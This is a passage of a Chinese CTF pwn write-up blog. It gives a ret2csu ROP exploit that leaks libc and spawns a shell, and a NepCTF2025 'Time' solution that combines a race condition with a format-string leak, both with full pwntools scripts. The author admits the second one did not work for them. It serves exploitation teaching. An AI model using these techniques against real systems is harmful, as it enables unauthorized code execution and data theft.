add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br><span class="line">.text:00000000004012B4 ; &#125; // starts at 401250</span><br><span class="line">.text:00000000004012B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>可以看到rdx &#x3D; r14，rsi &#x3D; r13，edi &#x3D; r12d，可以看到rdx,rsi,edi可以通过r14， r13，r12d来控制，从而我们就可以解决这些指令缺少的问</p>
<p>题。</p>
<p>具体讲一下怎么利用的：</p>
<p>当执行__libc_csu_init(.text:0000000000401285                 jz      short loc_4012A6)是先执行loc_4012A6:，再loc_401290: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14 //rdx = r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13 //rsi = r13</span><br><span class="line">.text:0000000000401296                 mov     edi, r12d //edi = r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx  //比较rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290 //判断为假跳到401290</span><br></pre></td></tr></table></figure>

<p>我们要他继续往下执行所以我们要是其为真，因此rbp, rbx得相等，我们先设置rbp &#x3D; 1，rbx &#x3D; 0；执行到add     rbx, 1 –&gt; rbx &#x3D; 1,正好达</p>
<p>到rbp &#x3D; rbx，r14设置成原本要在rdx要的参数，r13和r12也同理。</p>
<p>注释：由于高32位基本为0 ，所以  rdi &#x3D; edi &#x3D; r12d。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br></pre></td></tr></table></figure>

<p>我们只要把r15设置成我们需要执行的function，就可以 call function   。(r15+rbx * 8 &#x3D; r15+0 * 8 &#x3D; r15)</p>
<p>题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Start Your Exploit!\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Ok.\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>开启NX不能直接注入shellcode</p>
<p>这里找不到<code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>pop rdx; ret</code>但是有__libc_csu_init</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012b2 : pop r15 ; ret</span><br><span class="line">0x00000000004012ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004012af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004012b3 : pop rdi ; ret</span><br><span class="line">0x00000000004012b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004012ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x00000000004011ba : ret 0xfffe</span><br></pre></td></tr></table></figure>



<p>我们可以利用栈溢出构造ROP链进行攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">26879</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./1&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2csu&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got=<span class="number">0x404018</span></span><br><span class="line">write_plt=<span class="number">0x401064</span></span><br><span class="line">csu_start=<span class="number">0x0000000000401290</span></span><br><span class="line">csu_end=<span class="number">0x000000004012AA</span></span><br><span class="line">main=<span class="number">0x0000000004011DC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r15,r13,r14,r12,ret_addr</span>):</span><br><span class="line">    pay=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(csu_end)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay+=p64(csu_start)</span><br><span class="line">    pay+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(ret_addr)   //<span class="number">56</span>填充的是loc_4012A6的<span class="number">7</span>个pop|ret的地址。</span><br><span class="line">    io.sendline(pay)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,write_got,<span class="number">8</span>,<span class="number">1</span>,main)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ok.\n&quot;</span>)</span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;write_addr==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line">base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi = <span class="number">0x00000000004012b3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(ret)+p64(rdi)+p64(bin_sh_addr)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">NepCTF2025-部分pwn的wp(复现)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-01 08:34:14" itemprop="dateCreated datePublished" datetime="2025-08-01T08:34:14+08:00">2025-08-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-08-07 09:57:19" itemprop="dateModified" datetime="2025-08-07T09:57:19+08:00">2025-08-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>参考blog(<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
<h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>mian</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_2A31();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_2B0F() )</span><br><span class="line">      ;</span><br><span class="line">    pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_2A31()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_2A31</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, byte_50A0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you all file names in the current directory!&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">  argv[<span class="number">2</span>] = <span class="string">&quot;-al&quot;</span>;</span><br><span class="line">  argv[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    execve(<span class="string">&quot;/bin/ls&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  wait(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck :-)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_2B0F</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_2B0F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input file name you want to read:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, file);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(file, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is not allowed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>start_routine</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-46Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-468h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-464h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-400h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1000</span>]; <span class="comment">// [rsp+80h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+468h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1329(v6);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(file);</span><br><span class="line">  sub_1379(v6, file, v1);</span><br><span class="line">  sub_14CB(v6, v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you last file name content in md5:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)v7[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">999</span>; ++j )</span><br><span class="line">    buf[j] = <span class="number">0</span>;</span><br><span class="line">  fd = open(file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, buf, <span class="number">0x3E8u</span>LL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_50A0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; ,your file read done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file not found!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在start_routine的printf(byte_50A0);有格式化字符串漏洞很明显我们要把读入的flag通过的格式化字符串泄露出来。</p>
<p>可是在sub_2B0F读入的文件名对flag进行了过滤。这里就要了解一下进程和线程的关系了。</p>
<p><strong>线程与进程的基本关系（复习）</strong></p>
<ul>
<li><strong>进程（Process）</strong>：操作系统资源分配的基本单位。每个进程拥有独立的内存空间、文件描述符、环境变量等。进程之间相互隔离，通信需要通过 IPC（如管道、消息队列）。</li>
<li><strong>线程（Thread）</strong>：进程内的执行单元（轻量级进程）。多个线程共享同一进程的资源（如内存、文件描述符），但每个线程有自己的栈、寄存器和程序计数器。线程切换开销小，适合并发任务。</li>
</ul>
<p><strong>线程竞争（Race Condition）的定义和原因</strong></p>
<ul>
<li><strong>定义</strong>：当多个线程同时读写共享资源（如 <code>filename</code>），且没有同步机制（如锁）时，程序的执行结果依赖于线程调度的时序，导致不一致或错误。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">时间   事件</span><br><span class="line">----  ----</span><br><span class="line">t0    用户输入 &quot;temp.txt&quot; → main 线程设置 filename = &quot;temp.txt&quot;</span><br><span class="line">t1    main 启动 work 线程</span><br><span class="line">t2    work 线程开始 MD5 计算（耗时操作，持续到 t2+100ms）</span><br><span class="line">      ↳ 在此期间，main 线程被挂起（open 延迟）</span><br><span class="line">t2+50ms 用户输入 &quot;flag&quot; → main 线程设置 filename = &quot;flag&quot;（覆盖）</span><br><span class="line">t2+100ms work 线程完成 MD5 计算</span><br><span class="line">t2+101ms main 线程恢复，执行 open(filename) → 打开 &quot;flag&quot; 文件</span><br></pre></td></tr></table></figure>

<p>再用格式化字符串泄露flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa0x71a74c1fe8a0(nil)(nil)0x6(nil)0x10000000000x3000003e80x2000x36c63f9b4b69cc070x2bc422698ba00f710x80656d6974(nil)(nil)(nil)(nil)(nil)(nil)0x20(nil)0x36c63f9b4b69cc070x2bc422698ba00f710x10102464c457f(nil)0x1003e00030x12400x400x41980x380040000000000x1c001d0040000d0x4000000060x400x400x400x2d80x2d80x80x4000000030x318 ,your file read done!</span><br></pre></td></tr></table></figure>

<p>把16进制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80656d6974</span> ---&gt; time</span><br></pre></td></tr></table></figure>

<p>来算一下它在那个位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x71a74c1fe8a0 (nil (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x80656d6974 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x10102464c457f (nil) 0x1003e0003 0x1240 0x40 0x4198 0x38004000000000 0x1c001d0040000d 0x400000006 0x40 0x40 0x40 0x2d8 0x2d8 0x8 0x400000003 0x318 ,your file read done!  </span><br></pre></td></tr></table></figure>

<p>文件在12的位置，但是我们不知道内容在什么位置，我在本地创建一个fake:aaaa来算一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x7264a8ffe8a0 (nil) (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0x80656b6166 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0xa61616161  (nil) (nil) (nil) (nil) (nil) (nil)</span><br><span class="line">(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil) ,your file read done!</span><br></pre></td></tr></table></figure>

<p>在22的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置远程连接参数</span></span><br><span class="line">HOST = <span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化连接</span></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式字符串漏洞利用负载</span></span><br><span class="line">leak_payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>  <span class="comment"># 起始地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    leak_payload += <span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>  <span class="comment"># 连续泄露后续16个地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送名称触发漏洞</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>, leak_payload.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分阶段读取文件</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;time&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>, <span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>理论上是可以的但是没通，实际上也是可以的，因为别的师傅打出来，我没复现出来。</p>
<p>原作者的exp(<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
